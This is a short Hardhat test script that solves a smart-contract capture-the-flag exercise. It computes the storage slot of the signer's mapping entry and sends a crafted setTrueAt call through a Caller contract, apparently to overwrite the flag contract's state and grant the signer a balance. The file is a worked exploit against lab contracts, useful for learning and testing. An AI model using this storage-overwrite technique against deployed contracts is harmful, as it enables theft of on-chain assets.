const { assert } = require("chai");
const { ethers } = require("hardhat");

describe("Capture The Flag", function () {
  let signer0;
  let caller, callee, flag;
  beforeEach(async () => {
    const Flag = await ethers.getContractFactory("BlueFlag");
    flag = await Flag.deploy();
    await flag.deployed();

    const Callee = await ethers.getContractFactory("Callee");
    callee = await Callee.deploy();
    await callee.deployed();

    const Caller = await ethers.getContractFactory("Caller");
    caller = await Caller.deploy();
    await caller.deployed();

    await flag.transferOwnership(caller.address);

    signer0 = await ethers.provider.getSigner(0);
  });
  
  it("should capture", async function () {
    const paddedSlot = ethers.utils.hexZeroPad("0x2", "32");
    const paddedKey = ethers.utils.hexZeroPad(await signer0.getAddress(), "32");
    const baseSlot = ethers.utils.keccak256(paddedKey + paddedSlot.slice(2));

    await signer0.sendTransaction({
      to: caller.address,
      data: callee.interface.encodeFunctionData("setTrueAt", [baseSlot])
    });

    const balance = await flag.balanceOf(await signer0.getAddress());
    assert.isAbove(balance.toNumber(), 0);
  });
});